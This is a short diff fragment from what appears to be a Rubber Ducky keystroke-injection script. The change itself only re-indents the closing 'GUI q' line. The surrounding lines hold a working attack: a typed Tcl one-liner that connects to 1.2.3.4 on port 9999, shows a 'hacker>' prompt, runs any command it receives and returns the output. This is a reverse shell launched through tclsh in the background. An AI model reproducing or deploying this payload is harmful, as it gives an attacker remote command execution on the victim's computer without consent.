@@ -25,4 +25,4 @@ Rubber Ducky Script:
 	DELAY 1000
 	STRING echo 'set s [socket 1.2.3.4 9999];while 42 { puts -nonewline $s "hacker> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh &
 	ENTER
-GUI q
+	GUI q
